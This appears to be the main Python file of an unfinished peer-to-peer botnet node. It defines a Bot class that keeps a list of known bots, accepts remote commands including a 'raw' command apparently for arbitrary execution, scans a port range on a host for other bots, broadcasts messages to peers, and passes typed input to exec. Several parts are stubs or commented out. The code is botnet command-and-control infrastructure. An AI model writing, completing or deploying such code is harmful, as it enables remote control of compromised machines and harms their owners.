from Client.SocketClient import SocketClient
from Server.serverThread import ServerThread
from Server.SocketServer import SocketServer
from Handlers.MainHandler import Handler
from Handlers.CommandHandler import CommandHandler
from Handlers.JSONHandler import JSONHandler
from Command.PWDCommand import PWDCommand
from Command.SleepCommand import SleepCommand
from Command.RawCommand import RawCommand
from time import sleep
from peer import Peer
import logging
import sys
import shelve
from ipify import get_ip

# logging.basicConfig(level=logging.CRITICAL)

class Bot:

	def __init__(self): # SAVE AND LOAD BOT DESC AT STARTUP/ EDIT KINDA LIKE PROFILES ON WEBAPPS
		logging.info("[+] Intializing bot...")
		self.connections = {} # list of peers this bot is connected to
		self.clients = []
		self.knownBots = set()
		self.knownBotsDB = set()
		self.servers = []
		self.host = get_ip()
		self.port = None
		self.commands = {
			"pwd": PWDCommand,
			"sleep": SleepCommand,
			"raw": RawCommand,
		}

		logging.info("[+] Adding Handlers...")
		self.handler = Handler()
		self.handler.addHandler(CommandHandler(self.commands))
		self.handler.addHandler(JSONHandler(self))

		logging.info("[+] Starting Socket Server...")
		try:
			socketServerThread = ServerThread(SocketServer, self.handler, self)
			socketServerThread.start()
			self.servers.append(socketServerThread)
		except Exception as e:
			logging.warning(e.stackTrace)
			logging.warning("ERRROR CREATING SERVER THREAD")
		self.loadKnownBots()
	
	def loadKnownBots(self):
		with shelve.open('others') as db:
			if len(db.items()) == 0:
				db["knownBots"] = set()
			else:
				self.knownBotsDB = db["knownBots"]
				for i in self.knownBotsDB:
					self.knownBots.add(i)

	def saveKnownBots(self):
		with shelve.open('others') as db:
			if len(db.items()) == 0:
				db["knownBots"] = set()
			for i in self.knownBots:
				self.knownBotsDB.add(i)
			db["knownBots"]=self.knownBotsDB
		
	def loadPeerFromAbove(self):
		pass

	def addNewPeer(self, peer):

		if peer in self.knownBots:
			return False
		self.knownBots.add(peer)
		return True
		# newPeer = SocketClient(peer)
		# if newPeer.isActive:
		# 	# self.connections.append(peer)
		# 	self.connections[peer] = newPeer
		# 	self.clients.append(newPeer)
		# return False

	# def checkConnections(self):
	# 	newClients = []
	# 	for client in self.clients:
	# 		if client.isActive:
	# 			newClients.append(client)
	# 		else:
	# 			self.connections.remove(peer(client.ip,client.port))
	# 			self.client.remove(peer(client.ip,client.port))
	# 	self.clients = newClients

	def sendJSON(self, data, peer):
		client = self.connectTo(peer)
		if client:
			jsonData = json.dumps(data)
			client.send(jsonData)
			client.disconnect()
		else:
			print("[+] Connection Error: Cannot connect to peer")


	def forwardTo(self, data, peer):
		pass
		# another case for json handler
		# type = forward => add current ip and port to comming request and forward to every other bot // have a list of visited nodes to not form a cycle // even better have TTL
		# type = forwardBack => remove last ip and port, and forward request to it // if there are no more to pop, process the request
	
	def connectTo(self, peer):
		client = SocketClient(peer)
		return client if client.isActive else None

	## DEBUG
	def debugInfo(self):
		print("[*] Info about Current BOT => @"+":".join([self.host, str(self.port)]))
		print("Connections:",self.connections)
		print("Clients:",self.clients)
		print("Known Bots:",self.knownBots)
		print("Connections:",self.servers)
		print("Commands:",self.commands)

	def addPeer(self):
		ip = input("Enter Peer IP: ")
		port = input("Enter Peer port: ")
		self.addNewPeer(Peer(ip,port))
		logging.info("Added New Peer")

	def sendToAll(self):
		message = input("Message: ")
		for peer in self.knownBots:
			client = self.connectTo(peer)
			if client:
				logging.info("Sending data to",str(client))
				client.send(message)
				client.disconnect()

	def sendTo(self):
		message = input("Message: ")
		peerIP = input("Recievers Ip: ")
		peerPort = input("Recievers Port: ")
		peer = Peer(peerIP, peerPort)
		if peer in self.connections:
			client = self.connectTo(peer)
			client.send(message)
			client.disconnect()
			
		## else forward to all

	def sendToAllMessage(self, msg):
		message = msg
		for peer in self.connections:
			client = self.connectTo(peer)
			logging.info("Sending data to",str(client))
			client.send(message)
			client.disconnect()

	def scanPorts(self):
		host = input()
		print("[+] Scanning Ports for other bots")
		ports = range(45454, 50000)
		for port in ports:
			try:
				if self.connectTo(Peer(host, port)):
					self.addNewPeer(Peer(host, port))
					print("[+] Found a new bot at", host +":"+ str(port))
			except:
				pass

	def shutdown(self):
		self.saveKnownBots()
		for server in self.servers:
			server.stop()
		for client in self.clients:
			client.disconnect()
		sys.exit()
	
	def manual(self):
		cmd = input()
		print(exec(cmd))
try:
	bot = Bot()
	print("Bot started at", bot.host, bot.port)
	## TEMPORARY MENU
	opts = {
		0: bot.debugInfo,
		1: bot.addPeer,
		2: bot.loadKnownBots,
		3: bot.scanPorts,
		4: bot.sendTo,
		5: bot.sendToAll,
		6: bot.saveKnownBots,
		7:"",
		8: bot.manual,
		9: bot.shutdown,
	}
	choices = [
		"Debug Info",
		"Add peer",
		"Reload all Peers",
		"Scan ports on a host for other bots",
		"Send A Message To a Client",
		"Send A Message To all Clients",
		"Save all known bots",
		"",
		"Manual Manuever",
		"Shutdown bot"
	]
	DEBUG = len(sys.argv) > 1 and sys.argv[1] == "dev"
	while DEBUG:
		# bot.checkConnections()
		for opt in opts:
			if not opts[opt] == "":
				print(str(opt)+")",choices[opt])
		choice = input("> ")
		opts[int(choice)]()
		
except KeyboardInterrupt:
	print("","CTRL+C Pressed",sep="\n")
	print("Started closing servers, wait a minutes as this is gracefull")
	bot.shutdown()
	print("Done closing, Enjoy your day")
